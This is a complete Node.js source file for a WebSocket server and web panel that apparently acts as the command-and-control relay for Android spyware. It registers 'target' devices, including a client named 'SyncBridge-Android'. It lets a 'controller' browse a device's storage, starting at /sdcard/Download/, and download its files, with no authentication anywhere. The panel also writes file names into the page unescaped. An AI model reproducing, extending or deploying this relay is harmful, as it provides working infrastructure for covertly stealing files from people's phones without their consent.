const express = require('express');
const http = require('http');
const { WebSocketServer, WebSocket } = require('ws');

const app = express();
const PORT = process.env.PORT || 3000;

let targets = new Set();
let controllers = new Set();

app.get('/', (req, res) => {
    const isOnline = targets.size > 0;
    const statusText = isOnline ? '🟢 ONLINEy (' + targets.size + ' target/s)' : '🔴 OFFLINE';
    
    const html = `<!DOCTYPE html>
<html>
<head>
    <title>Remote File Explorer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f4f4f9; color: #333; }
        .container { max-width: 650px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h2 { margin-top: 0; color: #007bff; }
        .status { font-weight: bold; padding: 5px 10px; border-radius: 4px; display: inline-block; margin-bottom: 15px; }
        .online { background: #d4edda; color: #155724; }
        .offline { background: #f8d7da; color: #721c24; }
        .nav-bar { display: flex; gap: 5px; margin-bottom: 10px; }
        input, button { padding: 10px; font-size: 16px; box-sizing: border-box; }
        input { flex: 1; }
        button { background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #0056b3; }
        ul { list-style: none; padding: 0; margin-top: 20px; }
        li { padding: 10px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
        .file-info { display: flex; flex-direction: column; }
        .folder-link { font-weight: bold; color: #007bff; text-decoration: none; cursor: pointer; }
        .folder-link:hover { text-decoration: underline; }
        .file-meta { font-size: 12px; color: #666; margin-top: 2px; }
        li button { background: #28a745; width: auto; padding: 5px 10px; font-size: 14px; border: none; color: white; border-radius: 4px; cursor: pointer; }
        li button:hover { background: #218838; }
        #toast { position: fixed; bottom: 20px; right: 20px; background: #333; color: white; padding: 10px 20px; border-radius: 4px; display: none; z-index: 1000; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Remote File Manager</h2>
        <div>Target Status: <span id="status" class="status ${isOnline ? 'online' : 'offline'}">${statusText}</span></div>
        
        <div class="nav-bar">
            <button onclick="goUp()" title="Go up one directory" style="width: auto; background: #6c757d;">⬆ Up</button>
            <input type="text" id="pathInput" value="/sdcard/Download/" placeholder="Enter folder path">
            <button onclick="listDirectory()">List Files</button>
        </div>

        <ul id="fileList"></ul>
    </div>
    <div id="toast"></div>

    <script>
        const wsProtocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
        const ws = new WebSocket(wsProtocol + location.host);
        const statusEl = document.getElementById('status');
        const fileListEl = document.getElementById('fileList');

        ws.onopen = () => {
            ws.send(JSON.stringify({ type: 'REGISTER_CONTROLLER' }));
        };

        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            
            if (data.status === 'TARGET_STATUS') {
                statusEl.className = data.online ? 'status online' : 'status offline';
                statusEl.innerText = data.online ? '🟢 ONLINEyu' : '🔴 OFFLINE';
            }

            if (data.action === 'FILE_LIST') {
                fileListEl.innerHTML = '';
                if (data.files && data.files.length > 0) {
                    data.files.forEach(file => {
                        const li = document.createElement('li');
                        
                        const name = typeof file === 'string' ? file : file.name;
                        const isDir = typeof file === 'object' && file.isDirectory;
                        const size = typeof file === 'object' && !isDir ? ' (' + file.size + ' bytes)' : '';
                        const icon = isDir ? '📁 ' : '📄 ';

                        let nameHtml = '';
                        if (isDir) {
                            nameHtml = '<a class="folder-link" onclick="openDirectory(\\'' + name.replace(/'/g, "\\\\'") + '\\')">' + icon + name + '</a>';
                        } else {
                            nameHtml = '<span class="file-name">' + icon + name + '</span>';
                        }

                        li.innerHTML = \`
                            <div class="file-info">
                                \${nameHtml}
                                <span class="file-meta">\${isDir ? 'Directory' : 'File'}\${size}</span>
                            </div>
                            \${!isDir ? '<button onclick="fetchFile(\\'' + name.replace(/'/g, "\\\\'") + '\\')">Download</button>' : ''}
                        \`;
                        fileListEl.appendChild(li);
                    });
                } else {
                    fileListEl.innerHTML = '<li>No files found or empty directory.</li>';
                }
            }

            if (data.action === 'FILE_DATA') {
                showToast('Downloading ' + data.fileName + '...');
                try {
                    const binaryString = atob(data.content);
                    const bytes = new Uint8Array(binaryString.length);
                    for (let i = 0; i < binaryString.length; i++) {
                        bytes[i] = binaryString.charCodeAt(i);
                    }
                    const blob = new Blob([bytes], { type: 'application/octet-stream' });
                    const link = document.createElement('a');
                    link.href = URL.createObjectURL(blob);
                    link.download = data.fileName;
                    link.click();
                } catch(e) {
                    console.error('Download failed:', e);
                    showToast('Download failed: invalid data format');
                }
            }
        };

        function listDirectory() {
            const path = document.getElementById('pathInput').value.trim();
            ws.send(JSON.stringify({ action: 'LIST_FILES', path: path, type: 'LIST_FILES' }));
        }

        function openDirectory(folderName) {
            const input = document.getElementById('pathInput');
            let currentPath = input.value.trim();
            if (!currentPath.endsWith('/')) {
                currentPath += '/';
            }
            input.value = currentPath + folderName + '/';
            listDirectory();
        }

        function goUp() {
            const input = document.getElementById('pathInput');
            let parts = input.value.trim().split('/').filter(Boolean);
            if (parts.length > 1) {
                parts.pop();
                input.value = '/' + parts.join('/') + '/';
                listDirectory();
            }
        }

        function fetchFile(fileName) {
            const basePath = document.getElementById('pathInput').value.trim();
            const fullPath = basePath.endsWith('/') ? basePath + fileName : basePath + '/' + fileName;
            ws.send(JSON.stringify({ action: 'FETCH_FILE', filePath: fullPath, path: fullPath, type: 'FETCH_FILE' }));
            showToast('Requesting file download...');
        }

        function showToast(msg) {
            const t = document.getElementById('toast');
            t.innerText = msg;
            t.style.display = 'block';
            setTimeout(() => { t.style.display = 'none'; }, 3000);
        }
    </script>
</body>
</html>`;
    res.send(html);
});

const server = http.createServer(app);
const wss = new WebSocketServer({ server });

function broadcastStatus() {
    const isOnline = targets.size > 0;
    const msg = JSON.stringify({ status: 'TARGET_STATUS', online: isOnline });
    controllers.forEach(client => {
        if (client.readyState === WebSocket.OPEN) client.send(msg);
    });
}

wss.on('connection', (ws) => {
    let clientType = 'UNKNOWN';

    ws.on('message', (message) => {
        const rawText = message.toString();

        try {
            const data = JSON.parse(rawText);

            if (data.type === 'REGISTER_TARGET' || data.type === 'REGISTER_CLIENT' || data.client === 'SyncBridge-Android' || data.role === 'target' || data.type === 'target') {
                clientType = 'TARGET';
                targets.add(ws);
                console.log('Target Device registered successfully! Total targets:', targets.size);
                broadcastStatus();
                ws.send(JSON.stringify({ status: 'SUCCESS', role: 'TARGET' }));
                return;
            }

            if (data.type === 'REGISTER_CONTROLLER' || data.role === 'controller') {
                clientType = 'CONTROLLER';
                controllers.add(ws);
                console.log('Web Controller connected.');
                ws.send(JSON.stringify({ status: 'TARGET_STATUS', online: targets.size > 0 }));
                return;
            }

            // Route Controller -> Target with exhaustive multi-key formatting
            if (clientType === 'CONTROLLER') {
                if (targets.size > 0) {
                    const targetArr = Array.from(targets);
                    const activeTarget = targetArr[targetArr.length - 1];
                    if (activeTarget.readyState === WebSocket.OPEN) {
                        const reqPath = data.filePath || data.path;
                        let payload = {
                            ...data,
                            type: data.action || data.type,
                            action: data.action || data.type,
                            command: data.action || data.type,
                            path: reqPath,
                            filePath: reqPath,
                            file: reqPath
                        };
                        console.log('Forwarding to Target:', payload.action, 'Path/File:', reqPath);
                        activeTarget.send(JSON.stringify(payload));
                    }
                } else {
                    ws.send(JSON.stringify({ action: 'FILE_LIST', files: ['ERROR: Target device is offline.'] }));
                }
            }

            // Route Target -> All Controllers with Response Normalization
            else if (clientType === 'TARGET') {
                console.log('Received response from Target:', rawText);
                let normalizedData = data;
                
                const fileArray = data.files || data.fileList || data.list || data.data;
                if (fileArray || data.type === 'RESPONSE_LIST_FILES' || data.response === 'list_files' || data.action === 'list_files') {
                    normalizedData = {
                        action: 'FILE_LIST',
                        files: Array.isArray(fileArray) ? fileArray : []
                    };
                }
                else if (data.content || data.fileData || data.type === 'RESPONSE_FILE_DATA' || data.data) {
                    normalizedData = {
                        action: 'FILE_DATA',
                        fileName: data.fileName || data.name || data.filename || 'downloaded_file',
                        content: data.content || data.fileData || data.data
                    };
                }

                const finalMsg = JSON.stringify(normalizedData);
                controllers.forEach(ctrl => {
                    if (ctrl.readyState === WebSocket.OPEN) {
                        ctrl.send(finalMsg);
                    }
                });
            }
        } catch (err) {
            console.error('Error handling message:', err.message);
        }
    });

    ws.on('close', () => {
        if (clientType === 'TARGET') {
            targets.delete(ws);
            console.log('Target Device disconnected.');
            broadcastStatus();
        } else if (clientType === 'CONTROLLER') {
            controllers.delete(ws);
        }
    });
});

server.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
});
